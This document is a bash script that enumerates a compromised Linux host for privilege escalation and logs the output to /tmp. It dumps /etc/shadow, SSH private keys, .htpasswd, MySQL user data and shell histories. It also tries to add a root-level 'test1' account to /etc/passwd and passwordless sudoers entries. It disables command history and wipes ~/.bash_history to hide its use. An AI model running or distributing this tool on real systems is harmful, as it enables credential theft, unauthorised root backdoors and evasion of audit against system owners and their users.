#!/bin/bash
#This script will enumerate information used for privilege escalation
#Usage:        	                          ./lin3num.sh <RHOST>
B='\033[0;36m' #${B}
G='\033[0;32m' #${G}
R='\033[0;35m' #${R}
N='\033[0m'    #${N}
D='\033[5;35m' #${R}
export HISTSIZE=0 2>/dev/null
cd /tmp/
rm -r -f priv 2>/dev/null
clear
printf "${D}|-------------------------------|\n" | tee -a -i priv 
printf "|                               |\n" | tee -a -i priv
printf "|                               |\n" | tee -a -i priv
printf "|       Linux 3numeration       |\n" | tee -a -i priv
printf "|             -H1dz             |\n" | tee -a -i priv
printf "|                               |\n" | tee -a -i priv
printf "|                               |\n" | tee -a -i priv
printf "|-------------------------------|\n\n${N}" | tee -a -i priv
date 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Start------------------------------\n\n${N}" | tee -a -i priv
printf "${B}\n------------------------------IP------------------------------\n\n${G}" | tee -a -i priv
ip -br addr show 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------OS Kernel------------------------------\n\n${R}" | tee -a -i priv
uname -a 2>/dev/null | tee -a -i priv
cat /etc/*-release 2>/dev/null | tee -a -i priv
cat /proc/version 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Versions------------------------------\n\n${G}" | tee -a -i priv
bash --version 2>/dev/null | tee -a -i priv
sudo --version 2>/dev/null | tee -a -i priv
python --version 2>/dev/null | tee -a -i priv
python3 --version 2>/dev/null | tee -a -i priv
mysql --version 2>/dev/null | tee -a -i priv
php --version 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------User------------------------------\n\n${G}" | tee -a -i priv
hostname 2>/dev/null | tee -a -i priv
whoami 2>/dev/null | tee -a -i priv
dnsdomainname 2>/dev/null | tee -a -i priv
w 2>/dev/null | tee -a -i priv
cat /proc/$$/status | grep "[UG]id" 2>/dev/null | tee -a -i priv
echo "Search what the group the user is in and files related to it: find / -group <groupname>" 2>/dev/null | tee -a -i priv
id 2>/dev/null | tee -a -i priv
groups 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Sudo privileges------------------------------\n\n${R}" | tee -a -i priv
cat /etc/sudoers 2>/dev/null | tee -a -i priv
sudo -l 2>/dev/null | tee -a -i priv
sudo -l -l 2>/dev/null | tee -a -i priv
sudo -s 2>/dev/null | tee -a -i priv
sudo -i 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Read/Edit passwd/shadow/sudoers------------------------------\n\n${R}" | tee -a -i priv
echo "[+] /etc/passwd:" 2>/dev/null | tee -a -i priv	
cat /etc/passwd | grep home 2>/dev/null | tee -a -i priv
cat</etc/passwd 2>/dev/null | tee -a -i priv
echo "[+] /etc/shadow:" 2>/dev/null | tee -a -i priv	
less /etc/shadow 2>/dev/null | tee -a -i priv
cat /etc/shadow 2>/dev/null | tee -a -i priv
cat /etc/security/opasswd 2>/dev/null | tee -a -i priv
echo "[+] .htpasswd:" 2>/dev/null | tee -a -i priv	
cat /var/www/html/.htpasswd 2>/dev/null | tee -a -i priv 
cat ~/.htpasswd 2>/dev/null | tee -a -i priv 
echo "[+] Try add ROOT account to passwd / sudoers:" 2>/dev/null | tee -a -i priv	
echo "test1:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null | tee -a -i priv
echo "test1 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers 2>/dev/null | tee -a -i priv
echo "tes1 ALL=NOPASSWD: /bin/bash" >> /etc/sudoers 2>/dev/null | tee -a -i priv 
printf "${B}\n------------------------------SUID/SGID------------------------------\n\n${R}" | tee -a -i priv
echo "[+] SUID:" 2>/dev/null | tee -a -i priv	
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null | tee -a -i priv
echo "[+] SGID:" 2>/dev/null | tee -a -i priv	
find / -perm -g=s -type f 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------PATH------------------------------\n\n${R}" | tee -a -i priv
echo $PATH 2>/dev/null | tee -a -i priv
export PATH=/tmp:$PATH 2>/dev/null | tee -a -i priv
echo $PATH 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Crontabs------------------------------\n\n${R}" | tee -a -i priv
cat /etc/crontab 2>/dev/null | tee -a -i priv
ls -la /etc/cron.d/ 2>/dev/null | tee -a -i priv
crontab -l 2>/dev/null | tee -a -i priv
ps aux | grep cron 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Find id_rsa------------------------------\n\n${R}" | tee -a -i priv
grep PermitRootLogin /etc/ssh/sshd_config 2>/dev/null | tee -a -i priv
echo "[+] Seach for id_rsa:" 2>/dev/null | tee -a -i priv	
find / -name id_rsa 2>/dev/null | tee -a -i priv
find ~/ -name id_rsa 2>/dev/null | tee -a -i priv
echo "[+] Root id_rsa:" 2>/dev/null | tee -a -i priv	
cat /root/.ssh/id_rsa 2>/dev/null | tee -a -i priv
echo "[+] User id_rsa:" 2>/dev/null | tee -a -i priv
ls -la ~/.ssh 2>/dev/null | tee -a -i priv	
cat ~/.ssh/id_rsa 2>/dev/null | tee -a -i priv
cat ~/.ssh/id_key 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Capabilities------------------------------\n\n${R}" | tee -a -i priv
getcap -r / 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Internal Open Ports to Tunnel------------------------------\n\n${R}" | tee -a -i priv
netstat -tulpn 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Printer------------------------------\n\n${R}" | tee -a -i priv
lpstat -a 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Writable root files/folders------------------------------\n\n${G}" | tee -a -i priv
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Home dir------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/ 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------User file contents------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/* 2>/dev/null | tee -a -i priv							
printf "${B}\n------------------------------Inside a VM?------------------------------\n\n${G}" | tee -a -i priv
hostnamectl 2>/dev/null | tee -a -i priv
systemd-detect-virt 2>/dev/null | tee -a -i priv
tput -T screen longname 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Misc.------------------------------\n\n${G}" | tee -a -i priv
echo "[+] HTML directory:" 2>/dev/null | tee -a -i priv	
ls -la /var/www/html/ 2>/dev/null | tee -a -i priv
echo "[+] root directory:" 2>/dev/null | tee -a -i priv	
ls -la /root/ 2>/dev/null | tee -a -i priv
echo "[+] Intersting files:" 2>/dev/null | tee -a -i priv	
cat /etc/sudoers 2>/dev/null | tee -a -i priv
cat /etc/exports 2>/dev/null | tee -a -i priv 
cat /var/apache2/config.inc 2>/dev/null | tee -a -i priv
cat /var/www/html/configuration.php 2>/dev/null | tee -a -i priv
cat /var/lib/mysql/mysql/user.MYD 2>/dev/null | tee -a -i priv
cat /root/anaconda-ks.cfg 2>/dev/null | tee -a -i priv
cat ~/.sudo_as_admin_successful 2>/dev/null | tee -a -i priv
echo "[+] Processes running as ROOT:" 2>/dev/null | tee -a -i priv	
ps aux | grep root 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------History------------------------------\n\n${G}" | tee -a -i priv
history | tail 2>/dev/null | tee -a -i priv
echo "[+] bash:" 2>/dev/null | tee -a -i priv	
cat ~/.bash_history 2>/dev/null | tee -a -i priv
echo "[+] mysql:" 2>/dev/null | tee -a -i priv
cat ~/.mysql_history 2>/dev/null | tee -a -i priv
echo "[+] nano:" 2>/dev/null | tee -a -i priv
cat ~/.nano_history 2>/dev/null | tee -a -i priv
echo "[+] ftp:" 2>/dev/null | tee -a -i priv
cat ~/.atftp_history 2>/dev/null | tee -a -i priv
echo "[+] php:" 2>/dev/null | tee -a -i priv
cat ~/.php_history 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Finished------------------------------\n\n${N}" | tee -a -i priv
date 2>/dev/null | tee -a -i priv
cat /dev/null > ~/.bash_history 2>/dev/null
clear
cat priv

